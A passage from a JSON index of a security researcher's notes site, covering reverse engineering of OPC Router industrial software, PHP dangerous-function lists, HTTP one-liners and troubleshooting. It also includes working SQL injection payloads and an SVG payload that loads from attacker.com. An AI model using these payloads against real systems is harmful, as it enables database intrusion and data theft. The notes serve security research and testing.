        "content": "OPC-Router.com Exploitation and Vulnearbility Research Supported Platforms:\n OPC-Router 4.18 (named: **OPCRouter-4.18.5005.126.exe**)  Windows Server 2016 \u0026amp; 2012 R2 Windows 10 (also IoT) \u0026amp; 8.1   OPC-Router 4.18 (named: **OPCRouter-4.18.5005.126 (Windows 7).exe**)  Windows Server 2012 R1 \u0026amp; 2008 R2 Windows 8.0 \u0026amp; 7    What is OPC OLE for Process Control (OPC) is a set of standard interfaces based upon Microsoft\u0026rsquo;s OLE/COM technology. The application of the OPC standard interface makes possible interoperability between automation/control applications, field systems/devices etc.\nELI5: OPC is a \u0026ldquo;standard\u0026rdquo; used to share data in ICS between PC\u0026rsquo;s and:\n Enterprise Application, User Interfaces, Transport Layer, PLC \u0026amp; Devices  Usually, all vendors implements their own PLC Data Sharing Protocol which creates a large inconsistency and implementation in SCADA\u0026rsquo;d environment. OPC Foundation published an OPC standard for Automation Industry Organization and Industrial Control Systems.\nOPC Standards OPC offers a standard to Software Interface, decopupled from HMI/SCADA which is a great advantage. It comes usually in two parts:\n OPC Server - Exposes PLC memory address and label them as Tags. Tags are friendly name that maps to memory register in the PLC. Decouples the OPC Client from underlying DPMR. OPC Client - Used to connect to OPC Server and read respectable tags. OPC Data Access (OPC DA) - Browse infra for available OPC Servers. Browse OPC Server for tags and data. Can read/write Tags in a single call. Can subscribe to Tags for firing events in case of value(s) change. Blocking call therefore suspectable to DoS attack. Can lookup locations based on Cache or Device. OPC Unified Architecture (OPC UA) - This is new standard that will replace, modernize and enhance all the functionality of the existing OPC defined interfaces. OPC UA is described in a layered set of specifications broken into Parts. Basically, an \u0026ldquo;updated\u0026rdquo; OPC Standard. OPC Data Exchange (OPC DX) - Substandard/proto of OPC Standard.  Other terminology:\n HMI - Human Machine Interface SCADA - Supervisory Control \u0026amp; Data Acquisition DDE - Dynamic Data Exchange PLC - Programmable Logic Controller DCS - Distributed Control System â€“ purposes as a PLC, but highly optimized for process control, i.e. chemicals, oil/gas, food/beverage, pharmaceutical RTU - Remote Terminal Unit â€“ traditionally proprietary hardware â€“ as today PLCs can be used for RTU\u0026rsquo;s Register â€“ a memory location in a PLC or DCS. To some a register is a 16 bit word of data Tag, or Item â€“ a single unit of data â€“ can be digital or analog values, or even arry DCOM - Basically a protocol on top of Microsoft\u0026rsquo;s COM for RPC (Remote Procedure Call), offers communication between COM-based applications over the network.  OPC Reverse Engineering All downloaded installations, the OPCRouter and OPCServer (KEPServerEX) from the download page visible are put for further reuse into ./Installations directory.\nThe OPC Router connects systems vertically and horizontally, from sensors and controls to ERP and the cloud, from printers and scales to MES, SCADA or LIMS.\nVendor\n### inray Industriesoftware GmbH HolstenstraÃŸe 40, 25560 Schenefeld, Germany Phone: [+49 4892-89008-0](tel:+49 4892-89008-0) Email: [info@inray.de](mailto:info@inray.de) Web: [inray.de](https://www.inray.de/) DOWNLOAD LINKS:\n Demo Link Undirect Link  After installation, double-click the \u0026ldquo;OPC Router Configuration\u0026rdquo; from the Windows Desktop. This will open a OPC Router GUI for configuration.\nPrior to exploring, we need to setup the lab as per the manual:\n Requires  Accessible OPC Server to communicate with PLCs (OPC DA 4.0, UA, XML) - see below Accessible Database Server (MS SQL, Oracle, MySQL and all others via ODBC. MS Access and writing/reading XML files supported as well)  for Oracle, you need additional Oracle instant client (ODAC)   SAP plug-in supports SAP systems 4.0b or newer    Enabling extensive LOG files in OCP Router  Open OPC Router Configuration from the Desktop Shortcut Click Extras â†’ Settings from the Menu Bar Scroll to bottom of the Settings Pane/Tab Check all checkboxes in Log Output  Starting OPC Router Service(s)  Open OPC Router Configuration from the Desktop Shortcut Click Service â†’ Start from the Menu Bar Now you can open for example: C:\\OPCRouter4\\LogDir\\OPCRouterService_15.txt for detailed log output of a started service  Observations By default, a connection string is visible in OCP Router Config Logfile from above Profiling:\n `15.05.21 21:44:34.574[Trace:DacPac] SqlConstantConnection: SERVER=(localdb)\\.\\OPCRouter4;DATABASE=OPCRouterConfig;Trusted_Connection=Yes;APP=OPC-Router;Pooling=false;Connect Timeout=30`  `15.05.21 21:44:36.554[Trace:StorageManager] SqlConstantConnection: SERVER=(localdb)\\.\\OPCRouter4;DATABASE=OPCRouterConfig;Trusted_Connection=Yes;APP=OPC-Router;Pooling=false;Connect Timeout=30`  `15.05.21 21:44:36.639[Trace:StorageManager] SqlConstantConnection: SERVER=(localdb)\\.\\OPCRouter4;Trusted_Connection=Yes;APP=OPC-Router;Pooling=false;Connect Timeout=30`  `15.05.21 21:44:37.092[Trace:StorageManager] SqlConstantConnection: SERVER=(localdb)\\.\\OPCRouter4;DATABASE=OPCRouterLongTimeStorage;Trusted_Connection=Yes;APP=OPC-Router;Pooling=false;Connect Timeout=30` The application, when having started services running, have this information disclosed in State â†’ Service Status â†’ Dashboard. For example, see logs/Dashboard.xml on example:\nOPC Router 4 Service is starting at 15/05/2021 20:23:42 Starting RedundancyServerManager. Listening on port 49954 ... There are number of *.exe under OPC Router Installation Directory, as seen below:\n# =\u0026gt; SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe PS C:\\OPCRouter4\u0026gt; C:\\OPCRouter4\\SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe 02:39:14 Arguments are invalid! 02:39:14 inray.data.sqllocaldb.service.exe - inray.Data.LocalDB.Service - (c) Copyright by inray Industriesoftware Usage: inray.data.sqllocaldb.service.exe -n \u0026lt;arg\u0026gt; [-i -u] Available commands: ------------------- -n, --InstanceName The Name of the instance -i, --install install the service -u, --uninstall uninstall the service 02:39:14 \u0026lt;Enter\u0026gt; to continue... # =\u0026gt; It was also observed that the file *.config consists of XML key/val attributes # =\u0026gt; holding the Database settings PS C:\\OPCRouter4\u0026gt; more C:\\OPCRouter4\\SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe.config | grep InitialDatabase -C 10 .... \u0026lt;DatabaseConfiguration\u0026gt; \u0026lt;InitialDatabases\u0026gt; \u0026lt;Database Name=\u0026#34;OPCRouterConfig\u0026#34; BackupFile=\u0026#34;Backup\\OPCRouterConfig.bak\u0026#34;/\u0026gt; \u0026lt;Database Name=\u0026#34;OPCRouterShortTimeStorage\u0026#34; BackupFile=\u0026#34;Backup\\OPCRouterShortTimeStorage.bak\u0026#34;/\u0026gt; \u0026lt;Database Name=\u0026#34;OPCRouterLongTimeStorage\u0026#34; BackupFile=\u0026#34;Backup\\OPCRouterLongTimeStorage.bak\u0026#34;/\u0026gt; \u0026lt;Database Name=\u0026#34;OPCRouterRuntime\u0026#34; BackupFile=\u0026#34;Backup\\OPCRouterRuntime.bak\u0026#34;/\u0026gt; \u0026lt;/InitialDatabases\u0026gt; \u0026lt;/DatabaseConfiguration\u0026gt; \u0026lt;/configuration\u0026gt; # =\u0026gt; Later, it was discovered that intensive Log Files were also discovered in that subdirectory, as shown: PS C:\\OPCRouter4\\SQLLocalDB\\LogDir\u0026gt; ls Directory: C:\\OPCRouter4\\SQLLocalDB\\LogDir Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 15. 5. 2021. 23:59 256287 LoggerBase_15.txt -a---- 16. 5. 2021. 02:44 286907 LoggerBase_16.txt # =\u0026gt; @see logs/LoggerBase_16.txt for example # =\u0026gt; When using Process Explorer, there is a process (service) created and running # =\u0026gt; that shows the above utility running: # =\u0026gt; Process Explorer shows running this service as: C:\\OPCRouter4\\SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe -s -n \u0026#34;OPCRouter4\u0026#34; # =\u0026gt; To kill/debug server, you need to open Microsoft Windows # =\u0026gt; Control Panel and disable the Service # =\u0026gt; A registry editor shows this path for the above service # Computer\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\OPCRouter4-LocalDB # =\u0026gt; Disable service using below window from \u0026#34;Services\u0026#34; (Control Panel), and then # =\u0026gt; we can symlink this database for further exploration # =\u0026gt; MINGW64:/c/ Test Account@DESKTOP-RONDJPT MINGW64 /c $ ln -fs /c/OPCRouter4/ \u0026#34;//vmware-host/Shared Folders/InstallDir\u0026#34; # =\u0026gt; Now resume the service via exe path shown in \u0026#39;Services\u0026#39; To debug the above server, I used approach described here:\n Reference  # =\u0026gt; Run Windows Terminal with Admin Privs, and then: # Use gflags.exe to map Image File as a Service PS C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\u0026gt; .\\gflags.exe ... set as in below image and click Apply -\u0026gt; Launch ... ## Image: C:\\OPCRouter4\\SQLLocalDB\\inray.Data.SqlLocalDB.Service.exe -s -n \u0026#34;OPCRouter4\u0026#34; ## Debugger: C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\windbg.exe -server tcp:port=5005 -c \u0026#34;g\u0026#34; # Use WinDbg to connect to host PS C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\u0026gt; .\\windbg.exe --remote tcp:Port=5005,Server=127.0.0.1 # ... or attach via PID (that is, gflags.exe PID) Additional directory \u0026amp; files exists through the app lifecycle. For example, using API Monitor + SysMon we gathered these additional queries by the application, specifically in the directory C:\\ProgramData\\inray as well as %appdata%\\Local\\inray_industriesoftware_G:\n# =\u0026gt; Discovering more bin/lib(s) PS C:\\ProgramData\\inray\\AppSettings\u0026gt; more .\\OPCRouter4\\OPCRouter4.settings ... \u0026lt;/Password\u0026gt; \u0026lt;RuntimeCatalog\u0026gt;OPCRouterRuntime\u0026lt;/RuntimeCatalog\u0026gt; \u0026lt;Port\u0026gt;1433\u0026lt;/Port\u0026gt; \u0026lt;ConnectionTimeout\u0026gt;30\u0026lt;/ConnectionTimeout\u0026gt; \u0026lt;ConfigCatalog\u0026gt;OPCRouterConfig\u0026lt;/ConfigCatalog\u0026gt; \u0026lt;IntegratedSecurity\u0026gt;True\u0026lt;/IntegratedSecurity\u0026gt; \u0026lt;DatabaseServer\u0026gt;(localdb)\\.\\OPCRouter4\u0026lt;/DatabaseServer\u0026gt; # =\u0026gt; I copied this data in ~/Program Data/ directory of this project # =\u0026gt; @see: OPCRouter_OPC-Server@AR\\ProgramData\\inray --- # =\u0026gt; Likewise, in %appdata% directory, a user.config files are hidding PS C:\\Users\\Test Account\\AppData\\Local\\inray_Industriesoftware_G\u0026gt; ls Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 16. 5. 2021. 08:08 inray.Tool.DacPacDeploy.e_Url_wdxasxd1lwq2m54joacwxw1hqc3mijhx d----- 15. 5. 2021. 21:44 OPCRouterConfig.exe_StrongName_jw3q4nghqgrybwap5koxvkruxpapvd5j # =\u0026gt; I copied this data in ~/AppData_Local/ directory of this project # =\u0026gt; @see: OPCRouter_OPC-Server@AR\\AppData_Local\\inray_Industriesoftware_G During the File Monitor and File System analysis, I discovered a hidden (ie. Isolated Storage) identity being accessed from the Application:\nUse this for reference:\n# =\u0026gt; ./filemon ... identity.dat\tRead Write ReadAttributes Synchronize\tSUCCESS\t4\t5,89\t0.0.0.0\tC:\\Users\\Test Account\\AppData\\Local\\IsolatedStorage\\hfyw1qvw.lyh\\bfyk5gc3.2tn\\StrongName.q23pcsbq0aqsyq1ss2yaivhiqs3zep4o\\identity.dat ... # =\u0026gt; I made a backup of this directory for further research # =\u0026gt; @see: OPCRouter_OPC-Server@AR\\AppData_Local\\isolatedStorage\\StrongName.q23pcsbq0aqsyq1ss2yaivhiqs3zep4o All instances of database service(s) are visible in the next directory:\nC:\\Windows\\ServiceProfiles\\OPCRouter4-LocalDB\\AppData\\Local\\Microsoft\\Microsoft SQL Server Local DB\\Instances\\OPCRouter4\nAdditionally, using RegEdit.exe you can point to the next path and see observables used for Token Invocations:\nComputer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Microsoft SQL Server Local DB\\Shared Instances\\OPCRouter4 Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\inray Industriesoftware GmbH\\OPC-Router Deobfuscation C:\\tools\\de4dot-net45\\de4dot.exe -r c:\\input -ru -ro c:\\output # =\u0026gt; decompile with autodetection from stdin to stdout C:\\tools\\de4dot-net45\\de4dot.exe -d -r C:\\OPCRouter4\\ -ru -ro C:\\OPCRouter4-De\\ # =\u0026gt; detection only, skips unsupported obfuscators due to -ru C:\\tools\\de4dot-net45\\de4dot-x64.exe -f C:\\OPCRouter4\\OPCRouterConfig.exe -o C:\\OPCRouter4-De\\OPCRouterConfig.exe -p dr3 # =\u0026gt; uses .net reactor which works C:\\tools\\de4dot-net45\\de4dot.exe -r C:\\OPCRouter4\\ -ru -ro C:\\OPCRouter4-De-netr3\\ -p dr3 # =\u0026gt; not supported (recursive + specify cryptor) OPC Server As per OPC Router documentation, an OPC Server is required for data aggregation from Process Network layer.\nDo you need an OPC Server? If you also require an OPC Server for your project, we recommend the Kepware OPC Server: * https://www.kepware.com/en-us/products/kepserverex/ The Kepware OPC Server provides more than 160 communication drivers and can therefore be used for connecting many different control systems and IoT devices. References:\n Demo Download Install Guide Documentation / Manuals  Another option for OPC Server is to use MatrikonPC\u0026rsquo;s version available as a free/shareware on their website. I saw this paper being used in a Lab environment when reading \u0026ldquo;Penetration Testing of OPC as Part of Process Control Systems\u0026quot; doi:10.1007/978-3-540-69293-5_22\n Download Link  Resources:\n http://alvarestech.com/temp/smar/2019/OPC%20and%20DCOM%20-%205%20things%20you%20need%20to%20know%20-%20Windows%2010.pdf https://github.com/Engineering-Research-and-Development/opc-ua-car-server https://www.matrikonopc.com/resources/dictionary.aspx  OPC Test:\n Cisco Notes  Other Tools:\n binwalk Frida uniextractor pegasus for windbg dependecywalker fribratus  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/opcrouter-research.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/osint.html": {
        
        "title": "OSINT",
        "tags": [],
        "content": "Breach Compilation (1.4BILL)  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/osint.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/php-filesystem-functions.html": {
        
        "title": "PHP Filesystem Functions",
        "tags": [],
        "content": "Filesystem functions analysis as a part of PHP Source Code Analysis:\n// open filesystem handler fopen tmpfile bzopen gzopen SplFileObject-\u0026gt;__construct // write to filesystem (partially in combination with reading) chgrp chmod chown copy file_put_contents lchgrp lchown link mkdir move_uploaded_file rename rmdir symlink tempnam touch unlink imagepng - 2nd parameter is a path. imagewbmp - 2nd parameter is a path. image2wbmp - 2nd parameter is a path. imagejpeg - 2nd parameter is a path. imagexbm - 2nd parameter is a path. imagegif - 2nd parameter is a path. imagegd - 2nd parameter is a path. imagegd2 - 2nd parameter is a path. iptcembed ftp_get ftp_nb_get // read from filesystem file_exists file_get_contents file fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype glob is_dir is_executable is_file is_link is_readable is_uploaded_file is_writable is_writeable linkinfo lstat parse_ini_file pathinfo readfile readlink realpath stat gzfile readgzfile getimagesize imagecreatefromgif imagecreatefromjpeg imagecreatefrompng imagecreatefromwbmp imagecreatefromxbm imagecreatefromxpm ftp_put ftp_nb_put exif_read_data read_exif_data exif_thumbnail exif_imagetype hash_file hash_hmac_file hash_update_file md5_file sha1_file highlight_file show_source php_strip_whitespace get_meta_tags ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/php-filesystem-functions.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/php-source-code-analysis.html": {
        
        "title": "PHP Source Code Analysis",
        "tags": [],
        "content": "When looking at PHP applications and source code analysis process, one of the first things I grep and search for are for functions accepting $USER input with the potential to execute an external program or malform the input in some form or action:\nUse this grep command\n$ grep -nR \u0026#34;exec(\u0026#34; ./phpBB/ --include \\*.*php* | more` Important Function\nassert() create_function() eval() exec() Execution Operators (``) include() include_once() passthru() pcntl_exec() popen() preg_replace() (with `/e` modifier) proc_open() ReflectionFunction (class) require() require_once() shell_exec() system() Command Execution\nexec - Returns last line of commands output passthru - Passes commands output directly to the browser system - Passes commands output directly to the browser and returns last line shell_exec - Returns commands output `` (backticks) - Same as shell_exec() popen - Opens read or write pipe to process of a command proc_open - Similar to popen() but greater degree of control pcntl_exec - Executes a program PHP Code Execution\neval() assert() - identical to eval() preg_replace(\u0026#39;/.*/e\u0026#39;,...) - /e does an eval() on the match create_function() include() include_once() require() require_once() $_GET[\u0026#39;func_name\u0026#39;]($_GET[\u0026#39;argument\u0026#39;]); $func = new ReflectionFunction($_GET[\u0026#39;func_name\u0026#39;]); $func-\u0026gt;invoke(); or $func-\u0026gt;invokeArgs(array()); List of Functions which accept callbacks\nFunction =\u0026gt; Position of callback arguments \u0026#39;ob_start\u0026#39; =\u0026gt; 0, \u0026#39;array_diff_uassoc\u0026#39; =\u0026gt; -1, \u0026#39;array_diff_ukey\u0026#39; =\u0026gt; -1, \u0026#39;array_filter\u0026#39; =\u0026gt; 1, \u0026#39;array_intersect_uassoc\u0026#39; =\u0026gt; -1, \u0026#39;array_intersect_ukey\u0026#39; =\u0026gt; -1, \u0026#39;array_map\u0026#39; =\u0026gt; 0, \u0026#39;array_reduce\u0026#39; =\u0026gt; 1, \u0026#39;array_udiff_assoc\u0026#39; =\u0026gt; -1, \u0026#39;array_udiff_uassoc\u0026#39; =\u0026gt; array(-1, -2), \u0026#39;array_udiff\u0026#39; =\u0026gt; -1, \u0026#39;array_uintersect_assoc\u0026#39; =\u0026gt; -1, \u0026#39;array_uintersect_uassoc\u0026#39; =\u0026gt; array(-1, -2), \u0026#39;array_uintersect\u0026#39; =\u0026gt; -1, \u0026#39;array_walk_recursive\u0026#39; =\u0026gt; 1, \u0026#39;array_walk\u0026#39; =\u0026gt; 1, \u0026#39;assert_options\u0026#39; =\u0026gt; 1, \u0026#39;uasort\u0026#39; =\u0026gt; 1, \u0026#39;uksort\u0026#39; =\u0026gt; 1, \u0026#39;usort\u0026#39; =\u0026gt; 1, \u0026#39;preg_replace_callback\u0026#39; =\u0026gt; 1, \u0026#39;spl_autoload_register\u0026#39; =\u0026gt; 0, \u0026#39;iterator_apply\u0026#39; =\u0026gt; 1, \u0026#39;call_user_func\u0026#39; =\u0026gt; 0, \u0026#39;call_user_func_array\u0026#39; =\u0026gt; 0, \u0026#39;register_shutdown_function\u0026#39; =\u0026gt; 0, \u0026#39;register_tick_function\u0026#39; =\u0026gt; 0, \u0026#39;set_error_handler\u0026#39; =\u0026gt; 0, \u0026#39;set_exception_handler\u0026#39; =\u0026gt; 0, \u0026#39;session_set_save_handler\u0026#39; =\u0026gt; array(0, 1, 2, 3, 4, 5), \u0026#39;sqlite_create_aggregate\u0026#39; =\u0026gt; array(2, 3), \u0026#39;sqlite_create_function\u0026#39; =\u0026gt; 2, Information Disclosure\nphpinfo posix_mkfifo posix_getlogin posix_ttyname getenv get_current_user proc_get_status get_cfg_var disk_free_space disk_total_space diskfreespace getcwd getlastmo getmygid getmyinode getmypid getmyuid Other Notable Functions\nextract - Opens the door for register_globals attacks (see study in scarlet). parse_str - works like extract if only one argument is given. putenv ini_set mail - has CRLF injection in the 3rd parameter, opens the door for spam. header - on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header(\u0026#34;location: ...\u0026#34;); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area. proc_nice proc_terminate proc_close pfsockopen fsockopen apache_child_terminate posix_kill posix_mkfifo posix_setpgid posix_setsid posix_setuid Filesystem Functions\nRead up more on PHP Filesystem Functions. Investigate all filesystem handlers as a part of the analysis.\nReferences\nStackoverflow (1), Stackoverflow (2), SecLists.org\n", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/php-source-code-analysis.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/posts.html": {
        
        "title": "Posts",
        "tags": [],
        "content": "", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/posts.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/pure-reverse-engineering.html": {
        
        "title": "Pure Reverse Engineering",
        "tags": [],
        "content": "Some internal knowledge have been shared here. Otherwise, check references below.\nUse Byteman to instrument compiled Java application and Jar based files. A sample script has been included in the notes.\nReferences\n Debugging iOS binaries with lldb Bypass Flutter SSL Pinning (2021) Frida Android Function Enumerator and Dumper  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/pure-reverse-engineering.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/reverse-engineering-tricks-and-tips.html": {
        
        "title": "Reverse Engineering Tricks and Tips",
        "tags": [],
        "content": " Find threads by patching a jump with a short jump (EB FE) to create an endless loop you can then search for Looking for \u0026ldquo;CO A8\u0026rdquo; to find local IP addr prefix (192.168) Looking for 4-byte Unix timestamps in hex in a file format or a network packet Search/google all application constant values, classes and libraries Resize Hex Editor window to identify unknown structures and its sizes Check application Log messages and Xref them Replace all https calls with http (instead of hooking on each TLS thread and decrypting SSL) Using LD_PRELOAD to disable specific functions or patching binaries on the fly Use Burp + mitm_relay to proxy traffic Decompile JAR and attack via Frida, Byteman or any other dynamic instrumentation toolkit Use dotPeek to identify and process attack surface for anything .NET based  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/reverse-engineering-tricks-and-tips.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/server-anywhere.html": {
        
        "title": "Server Anywhere",
        "tags": [],
        "content": "Each of these commands will run an ad hoc http static server in your current (or specified) directory, available at http://localhost:8000. Use this power wisely.\nDiscussion on reddit.\nPython 2.x $ python -m SimpleHTTPServer 8000 Python 3.x $ python -m http.server 8000 Twisted (Python) $ twistd -n web -p 8000 --path . Or:\n$ python -c \u0026#39;from twisted.web.server import Site; from twisted.web.static import File; from twisted.internet import reactor; reactor.listenTCP(8000, Site(File(\u0026#34;.\u0026#34;))); reactor.run()\u0026#39; Depends on Twisted.\nRuby $ ruby -rwebrick -e\u0026#39;WEBrick::HTTPServer.new(:Port =\u0026gt; 8000, :DocumentRoot =\u0026gt; Dir.pwd).start\u0026#39; Credit: Barking Iguana\nRuby 1.9.2+ $ ruby -run -ehttpd . -p8000 Credit: nobu\nadsf (Ruby) $ gem install adsf # install dependency $ adsf -p 8000 Credit: twome\nNo directory listings.\nSinatra (Ruby) $ gem install sinatra # install dependency $ ruby -rsinatra -e\u0026#39;set :public_folder, \u0026#34;.\u0026#34;; set :port, 8000\u0026#39; No directory listings.\nPerl $ cpan HTTP::Server::Brick # install dependency $ perl -MHTTP::Server::Brick -e \u0026#39;$s=HTTP::Server::Brick-\u0026gt;new(port=\u0026gt;8000); $s-\u0026gt;mount(\u0026#34;/\u0026#34;=\u0026gt;{path=\u0026gt;\u0026#34;.\u0026#34;}); $s-\u0026gt;start\u0026#39; Credit: Anonymous Monk\nPlack (Perl) $ cpan Plack # install dependency $ plackup -MPlack::App::Directory -e \u0026#39;Plack::App::Directory-\u0026gt;new(root=\u0026gt;\u0026#34;.\u0026#34;);\u0026#39; -p 8000 Credit: miyagawa\nMojolicious (Perl) $ cpan Mojolicious::Lite # install dependency $ perl -MMojolicious::Lite -MCwd -e \u0026#39;app-\u0026gt;static-\u0026gt;paths-\u0026gt;[0]=getcwd; app-\u0026gt;start\u0026#39; daemon -l http://*:8000 No directory listings.\nhttp-server (Node.js) $ npm install -g http-server # install dependency $ http-server -p 8000 Note: This server does funky things with relative paths. For example, if you have a file /tests/index.html, it will load index.html if you go to /test, but will treat relative paths as if they were coming from /.\nnode-static (Node.js) $ npm install -g node-static # install dependency $ static -p 8000 No directory listings.\nPHP (\u0026gt;= 5.4) $ php -S 127.0.0.1:8000 Credit: /u/prawnsalad and MattLicense\nNo directory listings.\nErlang $ erl -s inets -eval \u0026#39;inets:start(httpd,[{server_name,\u0026#34;NAME\u0026#34;},{document_root, \u0026#34;.\u0026#34;},{server_root, \u0026#34;.\u0026#34;},{port, 8000},{mime_types,[{\u0026#34;html\u0026#34;,\u0026#34;text/html\u0026#34;},{\u0026#34;htm\u0026#34;,\u0026#34;text/html\u0026#34;},{\u0026#34;js\u0026#34;,\u0026#34;text/javascript\u0026#34;},{\u0026#34;css\u0026#34;,\u0026#34;text/css\u0026#34;},{\u0026#34;gif\u0026#34;,\u0026#34;image/gif\u0026#34;},{\u0026#34;jpg\u0026#34;,\u0026#34;image/jpeg\u0026#34;},{\u0026#34;jpeg\u0026#34;,\u0026#34;image/jpeg\u0026#34;},{\u0026#34;png\u0026#34;,\u0026#34;image/png\u0026#34;}]}]).\u0026#39; Credit: nivertech (with the addition of some basic mime types)\nNo directory listings.\nbusybox httpd $ busybox httpd -f -p 8000 Credit: lvm\nwebfs $ webfsd -F -p 8000 Depends on webfs.\nIIS Express C:\\\u0026gt; \u0026#34;C:\\Program Files (x86)\\IIS Express\\iisexpress.exe\u0026#34; /path:C:\\MyWeb /port:8000 Depends on IIS Express.\nCredit: /u/fjantomen\nNo directory listings. /path must be an absolute path.\n", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/server-anywhere.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/sqli-payloads.html": {
        
        "title": "SQLi Payloads",
        "tags": [],
        "content": "More examples might be avilable on netspi\nClassical Sleep:\n0\u0026#39;XOR(if(now()=sysdate(),sleep(15),0))XOR\u0026#39;Z =\u0026gt; 20.002 0\u0026#39;XOR(if(now()=sysdate(),sleep(6),0))XOR\u0026#39;Z =\u0026gt; 7.282 0\u0026#39;XOR(if(now()=sysdate(),sleep(0),0))XOR\u0026#39;Z =\u0026gt; 0.912 0\u0026#39;XOR(if(now()=sysdate(),sleep(15),0))XOR\u0026#39;Z =\u0026gt; 16.553 0\u0026#39;XOR(if(now()=sysdate(),sleep(3),0))XOR\u0026#39;Z =\u0026gt; 3.463 0\u0026#39;XOR(if(now()=sysdate(),sleep(0),0))XOR\u0026#39;Z =\u0026gt; 1.229 0\u0026#39;XOR(if(now()=sysdate(),sleep(6),0))XOR\u0026#39;Z =\u0026gt; 7.79 /api/tweets?city_id=(select(0)from(select(sleep(25)))v) â€™) AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 4376 UNION SELECT 4107) END))--+ type=sharesCountTw\u0026amp;url=http%3a%2f%2finsideok.ru%2flica\u0026amp;count=-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A)) SQL in useragent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36\u0026#39;;WAITFOR DELAY â€˜00:00:05â€™;-- Blind SQL Injection:\n# sleep on mysql 4.* 1\u0026#39; AND CASE (SUBSTRING(VERSION(), 1, 1)) WHEN 4 THEN SLEEP(10) ELSE NULL END AND \u0026#39;1 # sleep on mysql 5.* 1\u0026#39; AND CASE (SUBSTRING(VERSION(), 1, 1)) WHEN 5 THEN SLEEP(10) ELSE NULL END AND \u0026#39;1  ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/sqli-payloads.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/svg-payloads.html": {
        
        "title": "SVG Payloads",
        "tags": [],
        "content": "\u0026lt;rect fill=ï¿½url(//attacker.com/malicious.svg#exploit)ï¿½\u0026gt; (@see: https://hackerone.com/reports/347139) ", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/svg-payloads.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/tags.html": {
        
        "title": "Tags",
        "tags": [],
        "content": "", 
        "url": "https:\/\/duraki.github.io\/notes\/public\/tags.html"
    },
    
    
    
    "https:\/\/duraki.github.io\/notes\/public\/troubleshoot.html": {
        
        "title": "Troubleshoot",
        "tags": [],
        "content": "Hardware Fix Kappa Headphones on Apple Macbook\n Linux Fix RHEL SD Card Reader (Red Hat Enterprise Linux)\n Fix RHEL VPN forward options (see above)\n Fix Wireless for Macbook Air on RHEL (see above)\nDedicated post has been published on my blog. RHEL gets kinda buggy on Macbook Air (Intel).\n Bypasses Chrome Enterprise Policy Bypass\nVery annoying on JAMF\u0026rsquo;d and managed devices. Basically, Company provides a laptop with a bloatware in a form of Chrome extension. This is a trick I discovered around 2016. You can bypass \u0026ldquo;Enterprise\u0026rdquo; limitation and remove the Chrome extension from reapperaing.\n VirtualBox || VMWare When in Kali Linux and doing Security Assessment\n Make sure to set VMWare Kali Box to use NAT (so the VPN connection can be shared from Host, ie. MacOS)  When installing VMWare from JAMF but it doesn\u0026rsquo;t work\n Install VMWare via JAMF Store (to obtain License Key) Backup the license-fusion-120-e3-202001 from the JAMF Store VMWare Installation Application Support Manually downloading the new DMG Removing the JAMF Store VMWare installation Installing the DMG and activating via above license  Guest addition shared folder does not work\n# =\u0026gt; Work in linux-based vmbox $ sudo /usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other Guest addition shared clipboard does not work\n# =\u0026gt; Start from Terminal or on Startup $ /usr/bin/vmware-user # =\u0026gt; Another option is to bring daemon $ vmtoolsd -n vmusr # =\u0026gt; For Microsoft Windows \u0026gt; taskkill /F /IM vmtoolsd.exe \u0026gt; \u0026#34;C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\u0026#34; -n vmusr Fix Kali Linux screen resolution\nxrandr --newmode \u0026#34;2560x1440_40.00\u0026#34; 201.00 2560 2720 2984 3408 1440 1443 1448 1476 +hsync +vsync xrandr --addmode Virtual1 2560x1440_40.00 xrandr --output Virtual1 --mode 2560x1440_40.00 Install XFCE4 + Openbox in Kali\n(Increases Speedyness)\n$ apt-get install kali-defaults kali-root-login desktop-base xfce4 xfce4-places-plugin xfce4-goodies openbox # =\u0026gt; login in xfce session $ openbox --replace \u0026amp; exit Burp Proxy When connecting to a new wi-fi or internet connection, make sure to:\n Click Network in the Taskbar Properties Configure Firewall and Security Settings In Windows Security, click 